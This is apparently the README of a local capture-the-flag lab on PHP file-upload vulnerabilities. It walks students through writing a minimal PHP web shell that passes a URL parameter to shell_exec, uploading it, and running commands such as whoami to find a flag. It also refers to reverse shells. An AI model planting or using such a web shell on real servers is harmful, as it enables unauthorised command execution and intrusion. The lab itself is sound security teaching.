## PHP Vuln LAB

### Setup
1. To run the lab, make sure you have docker engine installed. The lab can be started by changing directories `cd LAB` and then you can start the container by running `sudo docker-compose up --build --remove-orphans`. - Note that if you currently use docker, the flag `--remove-orphans` may effect other containers you have. Consider changing the ports used in the configs and run with the basic `docker-compose up --build`.

2. Open your web browser and navigate to `http://localhost:8080/`

### Building the Malware

We want to see whats hiding in the criminals webserver. Why don't we exploit the fact that they are using PHP and write some malware! Maybe we can create a shell and run commands to see what's inside.

1. Create a file called `shell.php`, or whatever name you want to call your malware. (We are writing with php so feel free to obfuscate as you'd like for practice. You'll get brownie points?)

2. We want to be able to execute shell commands from the URL or setup a reverse shell. Refer to Dr. O'learys [Cyber Operations text book](https://www.amazon.com/Cyber-Operations-Building-Defending-Attacking/dp/1484242939) for details on how to setup reverse shells, and/or look into what a netcat listener is. Brownie Points for making a reverse shell, however for this lab we will just be focusing on pumping commands through the URL field in our browser.

- How can we execute shell commands through our browser? We want the server to recognize our GET requests as shell commands with the input `cmd`. Here is an example of how I would start to build mine:

```
<?php
if (isset($_GET['cmd'])) {
    $cmd = ($_GET['cmd']);
    // We want to be able to view the output. Is the following necessary?
    echo "<pre>";
    $output = shell_exec($cmd);
    echo $output;
    echo "</pre>";
    exit; // Exit after executing the command
}
?>
```
3. Upload your fresh and snazzy malware to the upload link and navigate to `http://localhost:8080/uploads/`. Use your intuition from here to see if you can inject some commands and locate the super secret flag!

Example Input:
`http://localhost:8080/uploads/shell.php?cmd=whoami`
